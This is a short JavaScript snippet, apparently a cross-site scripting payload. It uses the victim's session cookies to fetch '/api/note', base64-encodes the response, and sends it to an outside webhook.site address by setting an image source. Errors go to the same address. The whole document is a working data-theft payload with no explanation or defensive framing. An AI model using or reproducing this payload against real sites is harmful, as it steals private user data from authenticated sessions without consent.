(async () => {
  try {
    const r = await fetch('/api/note', {credentials:'include'});
    const j = await r.json().catch(()=>null);
    const data = j && j.note ? j.note : await r.text();
    new Image().src = 'https://webhook.site/0f85ed0a-d8a0-498a-8ee9-c34554ee027a/log?d=' +
      encodeURIComponent(btoa(unescape(encodeURIComponent(String(data)))));
  } catch(e) {
    new Image().src = 'https://webhook.site/0f85ed0a-d8a0-498a-8ee9-c34554ee027a/err?e=' +
      encodeURIComponent(String(e));
  }
})();
